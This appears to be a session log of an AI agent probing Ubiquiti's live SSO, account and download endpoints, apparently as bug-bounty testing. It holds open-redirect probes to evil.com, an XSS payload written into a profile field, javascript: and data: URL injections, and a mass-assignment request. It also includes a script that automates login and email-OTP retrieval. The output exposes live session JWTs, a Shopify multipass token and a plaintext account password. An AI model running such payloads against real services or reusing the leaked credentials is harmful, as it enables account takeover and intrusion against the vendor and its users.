+vulnebleti/Fuzz/extensions.txt
+vulnebleti/Fuzz/control-character-techniques.md
+vulnebleti/Fuzz/delimiters.txt
+vulnebleti/Fuzz/fuzzing_commands.md
+vulnebleti/Fuzz/unicode_alphabet.md
+vulnebleti/Fuzz/Unicode_a.txt
+vulnebleti/cache/cp-dost-1.md
+vulnebleti/cache/cache_deception_methodology.md
+vulnebleti/cache/cp-dos.md
+vulnebleti/cache/url_encoded_a_to_z.md
+vulnebleti/cache/cache-vulnerabilities-guide.md
+vulnebleti/cache/Advanced_Cache_Deception_Methodology.md
+vulnebleti/cache/find_cache_poisoning_dos_domains.md
+vulnebleti/Forget_password_endpoint/Exploit.md
+vulnebleti/cspt/find-sinks.md
+---
+ATO
+BAC
+File_upload
+Forget_password_endpoint
+Fuzz
+Idor
+LFI
+Secret_keys
+Sqli
+Ssrf
+cache
+cspt
+http_request_smuggling
+op-to-xss
+os-command-injection
+[0m
+[0m$ [0mcd /tmp/s34
+echo "=== Next.js version hints in www html ==="
+grep -oiE 'next[^"]{0,20}16\.[0-9]+\.[0-9]+|"version":"[0-9.]+"|buildId[^,]{0,40}' www.html | head
+grep -oE 'x-nextjs[^:]*' www-headers.txt | head
+echo "=== chunk for next version ==="
+grep -rhoE '16\.[0-9]+\.[0-9]+' wwwjs | sort | uniq -c | sort -rn | head
+=== Next.js version hints in www html ===
+x-nextjs-cache
+x-nextjs-prerender
+x-nextjs-prerender
+x-nextjs-stale-time
+=== chunk for next version ===
+      2 16.4.6
+      1 16.257.374
+      1 16.002.002
+[0m
+[0m$ [0mcd /tmp/s34/wwwjs
+echo "=== appview references ==="
+grep -rno 'appview' . | head
+echo
+echo "=== postMessage / message listeners ==="
+grep -rEno 'addEventListener\(["'"'"']message|onmessage|postMessage\(' . | head -30
+echo
+echo "=== 0w9frl-gaurpb contexts ==="
+grep -oE '.{80}(window\.open|location\.replace|location\.href).{100}' 0w9frl-gaurpb.js | head -12
+=== appview references ===
+./3qz-ufud26idy.js:917:appview
+
+=== postMessage / message listeners ===
+./3racnxu1ero-m.js:1:addEventListener("message
+./3racnxu1ero-m.js:1:postMessage(
+./0cz1d0mv5g_q7.js:1:postMessage(
+./0cz1d0mv5g_q7.js:1:onmessage
+./0cz1d0mv5g_q7.js:1:addEventListener("message
+./0w9snb1cuo60k.js:1:onmessage
+./0w9snb1cuo60k.js:1:postMessage(
+
+=== 0w9frl-gaurpb contexts ===
+rigin),i=new URL("/login",a);i.searchParams.set("redirect",t.toString()),window.location.replace(i)},"f",0,e=>{let t=new URL(window.origin);t.pathname=e??new URL(window.location.href).pathname;let
+[0m
+[0m$ [0mcd /tmp/s34/wwwjs
+for f in 0cz1d0mv5g_q7.js 0w9snb1cuo60k.js; do
+echo "===== $f addEventListener message ====="
+grep -oE '.{200}addEventListener\("message".{300}' "$f" | head -4
+echo
+echo "===== $f postMessage ====="
+grep -oE '.{120}postMessage\(.{160}' "$f" | head -4
+echo
+done
+===== 0cz1d0mv5g_q7.js addEventListener message =====
+tion(t){yy.now(Ry(t))}:by&&!py?(cy=(sy=new by).port2,sy.port1.onmessage=Py,uy=ar(cy.postMessage,cy)):i.addEventListener&&T(i.postMessage)&&!i.importScripts&&ay&&"file:"!==ay.protocol&&!a(Ay)?(uy=Ay,i.addEventListener("message",Py,!1)):uy=Oy in Et("script")?function(t){De.appendChild(Et("script"))[Oy]=function(){De.removeChild(this),xy(t)}}:function(t){setTimeout(Ry(t),0)});var jy={set:vy,clear:dy},ky=function(){this.head=null,this.tail=null};ky.prototype={add:function(t){var e={item:t,next:null},r=this.tail;r?r.next=e:th
+
+===== 0cz1d0mv5g_q7.js postMessage =====
+t)){var e=Ey[t];delete Ey[t],e()}},Ry=function(t){return function(){xy(t)}},Py=function(t){xy(t.data)},Ay=function(t){i.postMessage(wy(t),ay.protocol+"//"+ay.host)};vy&&dy||(vy=function(t){Up(arguments.length,1);var e=T(t)?t:my(t),r=vo(arguments,1);return Ey[++Sy]=function(){Ra(e,void 0,r)},
+
+===== 0w9snb1cuo60k.js addEventListener message =====
+
+===== 0w9snb1cuo60k.js postMessage =====
+nction(){S(z)};else if("u">typeof MessageChannel){var O=new MessageChannel,L=O.port2;O.port1.onmessage=z,i=function(){L.postMessage(null)}}else i=function(){w(z,0)};function M(e,t){N=w(function(){e(n.unstable_now())},t)}n.unstable_IdlePriority=5,n.unstable_ImmediatePriority=1,n.unstable_LowP
+[0m
+[0m$ [0mcd /tmp/s34
+echo "=== uisp.com / ubnt.com host checks in account.js ==="
+grep -oE '.{200}uisp\.com.{200}' account.js | head -6
+echo
+echo "=== hostname last-two-label logic ==="
+grep -oE '.{150}(split\(`\.`\)|split\("\.")).{250}' account.js | head -6
+=== uisp.com / ubnt.com host checks in account.js ===
+com":`https://ui.com`,UISP:`https://uisp.ui.com`,UniFi:`https://unifi.ui.com`},gw={...hw,...ove},sve=[hw.logout],cve=Object.values({...mw,...hw}).filter(e=>!sve.includes(e)),lve=[`ubnt.com`,`ui.com`,`uisp.com`],uve=new Set([`/login/trust-device`,`/security/suspicious/confirm`,`/login/create-passkey`,mw.switch]),_w=(e,t)=>{let n;try{n=new URL(decodeURI(encodeURI(e)))}catch(n){console.error(`Could not decod
+
+=== hostname last-two-label logic ===
+erCapture.onScroll.onWheel.onAnimationStart.onAnimationEnd.onAnimationIteration.onTransitionCancel.onTransitionEnd.onTransitionRun.onTransitionStart`.split(`.`)),xSe=/^(data-.*)$/;function UD(e,t={}){let{labelable:n,isLink:r,global:i,events:a=i,propNames:o}=t,s={};for(let t in e)Object.prototype.hasOwnProperty.call(e,t)&&(gSe.has(t)||n&&_Se.has(t)||r&&vSe.has(t)||i&&ySe.has(t)||a&&(bSe.has(t)||t.endsWith(`Ca
+ace(/\./g,`_`):void 0)??(typeof i.header==`string`?i.header:void 0),s;if(i.accessorFn?s=i.accessorFn:a&&(s=a.includes(`.`)?e=>{let t=e;for(let e of a.split(`.`))t=t?.[e];return t}:e=>e[i.accessorKey]),!o)throw Error();let c={id:`${String(o)}`,accessorFn:s,parent:r,depth:n,columnDef:i,columns:[],getFlatColumns:Uq(()=>[!0],()=>[c,...c.columns?.flatMap(e=>e.getFlatColumns())],Wq(e.options,`debugColumns`,`column
+[0m
+[0m$ [0mcd /tmp/s34
+python3 - <<'PY'
+s=open('account.js',encoding='utf-8',errors='replace').read()
+i=s.find('_w=(e,t)=>{')
+print(s[i:i+900])
+PY
+_w=(e,t)=>{let n;try{n=new URL(decodeURI(encodeURI(e)))}catch(n){console.error(`Could not decode URL`,{url:e,queryParam:t,e:n})}return n?.searchParams.get(t)},vw=(e,t)=>dve(e,[t]),dve=(e,t)=>{let n;try{return n=new URL(decodeURI(encodeURI(e))),t.forEach(e=>{n?.searchParams.delete(e)}),n.toString()}catch(n){console.error(`Could not decode URL`,{url:e,queryParams:t,e:n})}return e},yw=e=>{if(!e)return!1;try{let t=new URL(e),n=t.hostname.split(`.`).slice(-2).join(`.`),r=lve.includes(n),i=t.protocol===`http:`||t.protocol===`https:`;return r&&i}catch{return!1}},fve=e=>yw(e.href),pve=(e,t)=>{if(!t)return null;try{return new URL(t,e).href}catch(n){return console.error(`Could not build external URL`,{base:e,path:t,e:n}),null}},bw=(e,t,n)=>{let r={api:{accountBE:{base:`https://account.svc.ui.com`,paths:{zendeskUser:`zendesk/user`,zendeskCreateTicket:`zendesk/ticket`,zendeskOpenTickets:`zendesk/tic
+[0m
+Testing open-redirect handling on `sso.ui.com`/`account.ui.com` with the live session (safe GET probes).
+[0m$ [0mcd /tmp/s34
+UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+probe(){ curl -sS --max-time 15 --max-redirs 0 -b A.jar -A "$UA" -o /dev/null -w "%{http_code} loc=%{redirect_url}\n" "$1"; }
+for u in \
+ "https://sso.ui.com/api/sso/v1/zendesk_login?return_to=https://evil.com" \
+ "https://sso.ui.com/api/sso/v1/zendesk_login?return_to=//evil.com" \
+ "https://sso.ui.com/api/sso/v1/zendesk_login?return_to=https://evil.ui.com" \
+ "https://sso.ui.com/api/sso/v1/zendesk_login?return_to=https%3A%2F%2Fevil.com%2F%3F.ui.com" \
+ "https://sso.ui.com/api/sso/v1/jwt/token?redirect=https://evil.com" \
+ "https://sso.ui.com/api/sso/v1/jwt/token?redirect=//evil.com" \
+ "https://sso.ui.com/api/sso/v1/shopify_login?redirect=https://evil.com" \
+ "https://sso.ui.com/api/sso/v1/logout?redirect=https://evil.com" \
+ "https://sso.ui.com/login?redirect=https://evil.com" \
+ "https://account.ui.com/login?redirect=https://evil.com" \
+ "https://account.ui.com/login?redirect=//evil.com" \
+ "https://account.ui.com/login?redirect=javascript:alert(1)" ; do
+ echo -n "$u -> "; probe "$u"
+done
+https://sso.ui.com/api/sso/v1/zendesk_login?return_to=https://evil.com -> 302 loc=https://ubnt.zendesk.com/access/jwt?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiT3BlbkNvZGVUZXN0IiwiZW1haWwiOiJ0YW4udGlnZXI1NTY0QG1haWxkcm9wLmNjIiwiZXh0ZXJuYWxfaWQiOiJkODk0NmZhZC0yYjhlLTRjZjAtODJjNS01ZDk1NWI1N2I4MjkiLCJ2ZXJpZmllZCI6dHJ1ZSwianRpIjoiMDEzZGYwMGFlOWVmNDkwYTgzOGNiMDE5MTRiOWZhZTgiLCJpYXQiOjE3OTU4NTExOTUsImV4cCI6MTc5NTg1MTc5NSwicmVtb3RlX3Bob3RvX3VybCI6Imh0dHBzOi8vYWNjb3VudC1jZG4uc3ZjLnVpLmNvbS9kZWUyMjc5Yy1kZGU3LTRmYTktOTFjYi0xZTNkOTcxNjA5ZWEifQ.IJ-jJ7QB-0FOk24IqiKM-TTOGFCTe3Lgsx6_W0hNBm8&return_to=https%3A%2F%2Fevil.com
+https://sso.ui.com/api/sso/v1/zendesk_login?return_to=//evil.com -> 302 loc=https://ubnt.zendesk.com/access/jwt?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiT3BlbkNvZGVUZXN0IiwiZW1haWwiOiJ0YW4udGlnZXI1NTY0QG1haWxkcm9wLmNjIiwiZXh0ZXJuYWxfaWQiOiJkODk0NmZhZC0yYjhlLTRjZjAtODJjNS01ZDk1NWI1N2I4MjkiLCJ2ZXJpZmllZCI6dHJ1ZSwianRpIjoiZjIyNTY0MWM5N2M0NDY4NThmNmM3NjU0YThjYmVkMzYiLCJpYXQiOjE3OTU4NTExOTUsImV4cCI6MTc5NTg1MTc5NSwicmVtb3RlX3Bob3RvX3VybCI6Imh0dHBzOi8vYWNjb3VudC1jZG4uc3ZjLnVpLmNvbS9kZWUyMjc5Yy1kZGU3LTRmYTktOTFjYi0xZTNkOTcxNjA5ZWEifQ.Hl2PHnqGw9dHP42XKjxgysrp9qspVL6TIEm1jOhay4I&return_to=%2F%2Fevil.com
+https://sso.ui.com/api/sso/v1/zendesk_login?return_to=https://evil.ui.com -> 302 loc=https://ubnt.zendesk.com/access/jwt?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiT3BlbkNvZGVUZXN0IiwiZW1haWwiOiJ0YW4udGlnZXI1NTY0QG1haWxkcm9wLmNjIiwiZXh0ZXJuYWxfaWQiOiJkODk0NmZhZC0yYjhlLTRjZjAtODJjNS01ZDk1NWI1N2I4MjkiLCJ2ZXJpZmllZCI6dHJ1ZSwianRpIjoiMjUxYTc1ZTMyMjM2NDYwMmE2NGFkMWUzNTIxMTVlNGIiLCJpYXQiOjE3OTU4NTExOTUsImV4cCI6MTc5NTg1MTc5NSwicmVtb3RlX3Bob3RvX3VybCI6Imh0dHBzOi8vYWNjb3VudC1jZG4uc3ZjLnVpLmNvbS9kZWUyMjc5Yy1kZGU3LTRmYTktOTFjYi0xZTNkOTcxNjA5ZWEifQ.l0oZv4zw3wkeFqMtLe3yS9xUDKInH7mR-zCRhuezdLo&return_to=https%3A%2F%2Fevil.ui.com
+https://sso.ui.com/api/sso/v1/zendesk_login?return_to=https%3A%2F%2Fevil.com%2F%3F.ui.com -> 302 loc=https://ubnt.zendesk.com/access/jwt?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiT3BlbkNvZGVUZXN0IiwiZW1haWwiOiJ0YW4udGlnZXI1NTY0QG1haWxkcm9wLmNjIiwiZXh0ZXJuYWxfaWQiOiJkODk0NmZhZC0yYjhlLTRjZjAtODJjNS01ZDk1NWI1N2I4MjkiLCJ2ZXJpZmllZCI6dHJ1ZSwianRpIjoiYmRhZDY0NjlkMjY3NDJhYTgxYjI3OWE5NjI5OGY3MjgiLCJpYXQiOjE3OTU4NTExOTUsImV4cCI6MTc5NTg1MTc5NSwicmVtb3RlX3Bob3RvX3VybCI6Imh0dHBzOi8vYWNjb3VudC1jZG4uc3ZjLnVpLmNvbS9kZWUyMjc5Yy1kZGU3LTRmYTktOTFjYi0xZTNkOTcxNjA5ZWEifQ.7JLPPVZD5gHfM5KZRmhg3msEc3XnWl_x31zymdMuBuA&return_to=https%3A%2F%2Fevil.com%2F%3F.ui.com
+https://sso.ui.com/api/sso/v1/jwt/token?redirect=https://evil.com -> 200 loc=
+https://sso.ui.com/api/sso/v1/jwt/token?redirect=//evil.com -> 200 loc=
+https://sso.ui.com/api/sso/v1/shopify_login?redirect=https://evil.com -> 302 loc=https://us.shop.ui.com/account/login/multipass/mGy-OX_MkfByqUo8sENxCeeysGvE1w0GKEdzDFEEB5lCAiDqifAuWts9765hvobt3WQiMVKHBWp7iMj1GebxAAO3WDCwADO7LdNhiAsIADP7X-G86-LN49J-K3nTGWXEduLrigTYTSPBpXINHF2J3jodM5obqOUSDRgMRe0NTuWi1ICc-O1t933GYJwIQQfHwkg4XLpsj8GJ0ew3TQCDS-acFeq6iV9Tpn7qj9I_ReB_8lXURn2V74g34aQcJ7jiNpfisGFswt_Q6V7RbGDnYtSyCmD2746a-gwBiWa78CjDLD5Nvhc_ix6NFPICDrK7lngYjgrA2NcnBXtv2JCB_4s8otrF8uX1sv6Ts02JF_nKUGZ5kYG7PBsTOocENSEhnxb5Qa4mFN_hB8PYudIuXK8GrLinYFLe8DT55SmcGs1iwzX2TH4ERg1zSlp9wRxk
+https://sso.ui.com/api/sso/v1/logout?redirect=https://evil.com -> 302 loc=https://account.ui.com/login
+https://sso.ui.com/login?redirect=https://evil.com -> 404 loc=
+https://account.ui.com/login?redirect=https://evil.com -> 200 loc=
+https://account.ui.com/login?redirect=//evil.com -> 200 loc=
+https://account.ui.com/login?redirect=javascript:alert(1) -> 200 loc=
+[0m
+`zendesk_login` forwards `return_to` verbatim. Following one hop to observe whether the in-scope-initiated redirect is honored (read-only).
+[0m$ [0mcd /tmp/s34
+UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+# get the sso Location for a benign external return_to
+LOC=$(curl -sS --max-time 15 --max-redirs 0 -b A.jar -A "$UA" -o /dev/null -w "%{redirect_url}" "https://sso.ui.com/api/sso/v1/zendesk_login?return_to=https://example.com/x")
+echo "SSO Location (truncated):"; echo "$LOC" | sed -E 's/(jwt=[A-Za-z0-9._-]{20})[A-Za-z0-9._-]+/\1.../'
+echo
+echo "=== hop to Zendesk access/jwt (observe redirect only) ==="
+curl -sS --max-time 20 --max-redirs 0 -A "$UA" -D zd-headers.txt -o /dev/null "$LOC" -w "code=%{http_code} redirect=%{redirect_url}\n" || echo "curl-failed"
+echo "--- zendesk response headers (Location) ---"
+grep -iE '^(HTTP/|location:|referrer-policy:|set-cookie:)' zd-headers.txt | sed -E 's/(jwt=)[A-Za-z0-9._-]+/\1<redacted>/' | head -20
+SSO Location (truncated):
+https://account.ui.com/login?redirect=https%3A%2F%2Fsso.ui.com%2Fapi%2Fsso%2Fv1%2Fzendesk_login%3Freturn_to%3Dhttps%3A%2F%2Fexample.com%2Fx
+
+=== hop to Zendesk access/jwt (observe redirect only) ===
+code=200 redirect=
+--- zendesk response headers (Location) ---
+HTTP/2 200 
+referrer-policy: origin
+[0m
+[0m$ [0mcd /tmp/s34
+UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+echo "A /user/self:"; curl -sS --max-time 15 -b A.jar -A "$UA" https://sso.ui.com/api/sso/v1/user/self -o /dev/null -w "%{http_code}\n"
+echo "A zendesk_login (clean):"
+curl -sS --max-time 15 --max-redirs 0 -b A.jar -A "$UA" -o /dev/null -w "%{http_code} %{redirect_url}\n" "https://sso.ui.com/api/sso/v1/zendesk_login?return_to=https://example.com/x" | sed -E 's/(jwt=)[A-Za-z0-9._-]{20}[A-Za-z0-9._-]+/\1<redacted>/'
+A /user/self:
+401
+A zendesk_login (clean):
+302 https://account.ui.com/login?redirect=https%3A%2F%2Fsso.ui.com%2Fapi%2Fsso%2Fv1%2Fzendesk_login%3Freturn_to%3Dhttps%3A%2F%2Fexample.com%2Fx
+[0m
+Logout probe invalidated A (expected). Re-authenticating A with a reusable helper.
+[0m$ [0mcat > /tmp/s34/login.sh <<'EOF'
+#!/usr/bin/env bash
+# usage: login.sh <mailbox> <user> <pass> <jar> <emailauthid>
+set -u
+MB="$1"; USER="$2"; PASS="$3"; JAR="$4"; AUTHID="$5"
+UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+rm -f "$JAR"
+code=$(curl -sS --max-time 25 -c "$JAR" -A "$UA" -H 'Content-Type: application/json' -H 'Origin: https://account.ui.com' -H 'Referer: https://account.ui.com/' \
+  -X POST https://sso.ui.com/api/sso/v1/login --data "{\"user\":\"$USER\",\"password\":\"$PASS\",\"remember_me\":true}" -o /tmp/s34/_login.json -w "%{http_code}")
+if [ "$code" != "499" ]; then echo "password step unexpected: $code"; head -c 300 /tmp/s34/_login.json; exit 1; fi
+# trigger OTP
+curl -sS --max-time 20 -b "$JAR" -c "$JAR" -A "$UA" -H 'Content-Type: application/json' -H 'Origin: https://account.ui.com' \
+  -X POST "https://sso.ui.com/api/sso/v2/user/self/mfa/email/$AUTHID/send" --data '{}' -o /dev/null
+sleep 8
+# latest inbox
+curl -sS --max-time 20 -H 'Content-Type: application/json' -X POST https://api.maildrop.cc/graphql \
+  --data "{\"query\":\"query { inbox(mailbox:\\\"$MB\\\") { id date } }\"}" -o /tmp/s34/_inbox.json
+MID=$(python3 -c 'import json;d=json.load(open("/tmp/s34/_inbox.json"));xs=sorted(d["data"]["inbox"],key=lambda m:m["date"]);print(xs[-1]["id"] if xs else "")')
+[ -z "$MID" ] && { echo "no mail"; exit 1; }
+curl -sS --max-time 20 -H 'Content-Type: application/json' -X POST https://api.maildrop.cc/graphql \
+  --data "{\"query\":\"query { message(mailbox:\\\"$MB\\\", id:\\\"$MID\\\") { html } }\"}" -o /tmp/s34/_msg.json
+OTP=$(python3 - <<'PY'
+import json,re,html
+d=json.load(open('/tmp/s34/_msg.json'))
+h=d.get('data',{}).get('message',{}).get('html','')
+t=html.unescape(re.sub('<[^>]+>',' ',h))
+m=re.search(r'verification code is:\s*(\d{6})',t) or re.search(r'\b(\d{6})\b',t)
+print(m.group(1) if m else '')
+PY
+)
+[ -z "$OTP" ] && { echo "no otp"; exit 1; }
+code=$(curl -sS --max-time 25 -b "$JAR" -c "$JAR" -A "$UA" -H 'Content-Type: application/json' -H 'Origin: https://account.ui.com' -H 'Referer: https://account.ui.com/login/2fa' \
+  -X POST https://sso.ui.com/api/sso/v1/login/2fa --data "{\"token\":\"$OTP\"}" -o /tmp/s34/_2fa.json -w "%{http_code}")
+echo "2fa: $code"; head -c 120 /tmp/s34/_2fa.json; echo
+curl -sS --max-time 20 -b "$JAR" -A "$UA" https://sso.ui.com/api/sso/v1/user/self -o /dev/null -w "self: %{http_code}\n"
+EOF
+chmod +x /tmp/s34/login.sh
+# A: email auth id from earlier = b82c4c7d-f733-44c1-b6db-ffa6d5f8183b
+/tmp/s34/login.sh tan.tiger5564 tan.tiger5564@maildrop.cc 'Acd3423@#345' /tmp/s34/A.jar b82c4c7d-f733-44c1-b6db-ffa6d5f8183b
+2fa: 200
+{"username":"testttt12","email":"tan.tiger5564@maildrop.cc","curr_terms_rev":"REV2013-01-18","curr_privacy_rev":"REV2013
+self: 200
+[0m
+[0m$ [0mcd /tmp/s34
+UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+LOC=$(curl -sS --max-time 15 --max-redirs 0 -b A.jar -A "$UA" -o /dev/null -w "%{redirect_url}" "https://sso.ui.com/api/sso/v1/zendesk_login?return_to=https://example.com/x")
+echo "sso -> zendesk (has return_to?):"; echo "$LOC" | grep -oE 'return_to=[^&]+'
+echo "=== fetch zendesk hop body ==="
+curl -sS --max-time 20 --max-redirs 0 -A "$UA" -D zd-h2.txt -o zd-b2.html "$LOC" -w "code=%{http_code}\n"
+grep -iE '^(HTTP/|location:|content-type:|referrer-policy:)' zd-h2.txt
+echo "--- body signals ---"
+grep -oiE 'example\.com|meta[^>]*refresh[^>]*|window\.location[^;]{0,80}|return_to|access/jwt|sign in|log in' zd-b2.html | head -20
+echo "--- body size ---"; wc -c zd-b2.html
+sso -> zendesk (has return_to?):
+return_to=https%3A%2F%2Fexample.com%2Fx
+=== fetch zendesk hop body ===
+code=302
+HTTP/2 302 
+content-type: text/html; charset=utf-8
+location: https://help.ui.com/access/return_to?challenge=4GRertBxtkIuV0sFGPOkU5lIR&locale=en-US-x-1&return_to=https://help.ui.com/hc
+--- body signals ---
+--- body size ---
+0 zd-b2.html
+[0m
+Confirmed `return_to` is normalized to `help.ui.com/hc` (prior conclusion holds). Now testing the in-scope `account.svc` Zendesk create endpoint for mass-assignment variants (new fields).
+[0m$ [0mcd /tmp/s34
+UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+echo "=== A zendesk user ==="
+curl -sS --max-time 20 -b A.jar -A "$UA" https://account.svc.ui.com/zendesk/user -o zuserA.json -w "%{http_code}\n"; cat zuserA.json; echo
+echo "=== A open tickets (shape) ==="
+curl -sS --max-time 20 -b A.jar -A "$UA" "https://account.svc.ui.com/zendesk/tickets" -o ztickA.json -w "%{http_code}\n"
+head -c 600 ztickA.json; echo
+echo "=== create ticket baseline+mass-assignment (requester_id=B, organization_id, assignee_id, status, collaborators) ==="
+curl -sS --max-time 25 -b A.jar -A "$UA" -H 'Content-Type: application/json' -H 'Origin: https://account.ui.com' \
+ -X POST https://account.svc.ui.com/zendesk/ticket \
+ --data '{"subject":"s34 mass-assign test","comment":"s34 benign test body","requester_id":44644404389911,"organization_id":1,"assignee_id":1,"status":"closed","priority":"urgent","collaborators":["overrated.chinchilla337@maildrop.cc"],"tags":["s34"]}' \
+ -o zcreate.json -D zcreate.h -w "%{http_code}\n"
+head -c 800 zcreate.json; echo
+echo "--- ratelimit headers ---"; grep -iE 'ratelimit|retry-after' zcreate.h | head
+=== A zendesk user ===
+200
+{"zendeskUser":{"id":"44644434942359","url":"https://ubnt.zendesk.com/api/v2/users/44644434942359.json","name":"OpenCodeTest","email":"tan.tiger5564@maildrop.cc","created_at":"2026-10-30T06:20:59Z","updated_at":"2026-11-23T07:51:36Z","time_zone":"Mountain Time (US & Canada)","iana_time_zone":"America/Denver","phone":null,"shared_phone_number":null,"photo":null,"locale_id":1,"locale":"en-US","organization_id":null,"role":"end-user","verified":true,"external_id":"d8946fad-2b8e-4cf0-82c5-5d955b57b829","tags":[],"alias":null,"active":true,"shared":false,"shared_agent":false,"last_login_at":"2026-11-23T07:51:36Z","two_factor_auth_enabled":null,"signature":null,"details":null,"notes":null,"role_type":null,"custom_role_id":null,"is_billing_admin":null,"moderator":false,"ticket_restriction":"requested","only_private_comments":false,"restricted_agent":false,"suspended":false,"default_group_id":null,"report_csv":false,"user_fields":{"user_type":null,"enterprise_partner_program_user":null,"vip_user":false,"agent_slack_id":null,"agent_lead_slack_id":null,"site_support_pin":null,"user_notes":null,"quickie_user_settings":null},"suspension_details":null}}
+=== A open tickets (shape) ===
+200
+{"tickets":[{"id":"6138711","description":"Harmless cross-account injection test OCEAN-XACC-AtoB-1413. Marker <b>XACC1413</b> and <img src=x alt=\"XACC1413\">. Please ignore.","created_at":"2026-11-12T00:35:17Z","updated_at":"2026-11-16T06:36:53Z","subject":"OCEAN-XACC-AtoB-1413","status":"Answered","type":"question","requester_id":"44644434942359","assignee_id":"2275242938","collaborator_ids":[],"is_pending":false}],"totalTickets":1}
+=== create ticket baseline+mass-assignment (requester_id=B, organization_id, assignee_id, status, collaborators) ===
+400
+{"code":"BAD_REQUEST","message":"Invalid input, please check and try again."}
+--- ratelimit headers ---
+x-ratelimit-limit: 1
+x-ratelimit-remaining: 0
+x-ratelimit-reset: 1795855605
+[0m
+Zendesk create is rate-limited (1/period) and the mass-assignment payload was rejected (400). Testing a new in-scope variant: direct `picture` field mass assignment on `PUT /user/self`.
+[0m$ [0mcd /tmp/s34
+UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+echo "=== baseline picture ==="
+curl -sS --max-time 15 -b A.jar -A "$UA" https://sso.ui.com/api/sso/v1/user/self -o before.json
+python3 -c 'import json;print(json.load(open("before.json")).get("picture"))'
+echo "=== PUT picture = external URL ==="
+curl -sS --max-time 20 -b A.jar -A "$UA" -H 'Content-Type: application/json' -H 'Origin: https://account.ui.com' \
+ -X PUT https://sso.ui.com/api/sso/v1/user/self --data '{"picture":"https://example.com/s34.png"}' -o put1.json -w "%{http_code}\n"; head -c 300 put1.json; echo
+curl -sS --max-time 15 -b A.jar -A "$UA" https://sso.ui.com/api/sso/v1/user/self -o after.json
+python3 -c 'import json;print("picture now:",json.load(open("after.json")).get("picture"))'
+echo "=== PUT first_name HTML marker ==="
+curl -sS --max-time 20 -b A.jar -A "$UA" -H 'Content-Type: application/json' -H 'Origin: https://account.ui.com' \
+ -X PUT https://sso.ui.com/api/sso/v1/user/self --data '{"first_name":"<img src=x onerror=alert(1)>"}' -o put2.json -w "%{http_code}\n"; head -c 300 put2.json; echo
+curl -sS --max-time 15 -b A.jar -A "$UA" https://sso.ui.com/api/sso/v1/user/self -o after2.json
+python3 -c 'import json;d=json.load(open("after2.json"));print("first_name now:",repr(d.get("first_name")))'
+echo "=== restore first_name ==="
+curl -sS --max-time 20 -b A.jar -A "$UA" -H 'Content-Type: application/json' -H 'Origin: https://account.ui.com' \
+ -X PUT https://sso.ui.com/api/sso/v1/user/self --data '{"first_name":"OpenCodeTest"}' -o put3.json -w "%{http_code}\n"; head -c 120 put3.json; echo
+=== baseline picture ===
+https://account-cdn.svc.ui.com/dee2279c-dde7-4fa9-91cb-1e3d971609ea
+=== PUT picture = external URL ===
+204
+
+picture now: https://account-cdn.svc.ui.com/dee2279c-dde7-4fa9-91cb-1e3d971609ea
+=== PUT first_name HTML marker ===
+429
+{"error": "RATE_LIMITED", "detail": "Too many requests", "retry_after": 0}
+first_name now: 'OpenCodeTest'
+=== restore first_name ===
+204
+[0m
+[0m$ [0mcd /tmp/s34/wwwjs
+echo "=== fw-download allowlist contexts ==="
+grep -rno 'fw-download\.ubnt\.com' . | head
+for f in $(grep -rl 'fw-download\.ubnt\.com' .); do
+  echo "--- $f ---"
+  grep -oE '.{300}fw-download\.ubnt\.com.{200}' "$f" | head -2
+done
+=== fw-download allowlist contexts ===
+[0m
+The download allowlist lives in a lazy chunk. Testing it at runtime with Chrome MCP on the new deploy.
+[0m⚙ [0mchrome-devtools_new_page {"url":"https://www.ui.com/download/unifi/download-started?link=https://evil.com/s34.zip"}
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":2,"function":"async () => {\n  await new Promise(r=>setTimeout(r,4000));\n  const anchors=[...document.querySelectorAll('a')].map(a=>({t:a.textContent.trim().slice(0,30),h:a.href,dl:a.getAttribute('download')})).filter(x=>x.h);\n  const ifr=[...document.querySelectorAll('iframe')].map(f=>f.src);\n  return {\n    url: location.href,\n    hasEvil: document.documentElement.outerHTML.includes('evil.com'),\n    evilAnchors: anchors.filter(a=>a.h.includes('evil.com')),\n    iframes: ifr,\n    sampleAnchors: anchors.slice(0,12)\n  };\n}"}
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":2,"function":"async () => {\n  const tests=[\n    'https://www.ui.com/download/unifi/download-started?link=javascript:alert(document.domain)',\n    'https://www.ui.com/download/unifi/download-started?link=//evil.com/x.zip',\n    'https://www.ui.com/download/unifi/download-started?link=https://dl.ui.com@evil.com/x.zip',\n    'https://www.ui.com/download/unifi/download-started?link=https://dl.ui.com.evil.com/x.zip',\n    'https://www.ui.com/download/unifi/download-started?link=data:text/html,<script>alert(1)</script>'\n  ];\n  const out=[];\n  for (const u of tests){\n    // can't navigate in evaluate reliably; just fetch the page html and check RSC, plus record\n    out.push({u});\n  }\n  return {note:'navigation handled separately', count:out.length};\n}"}
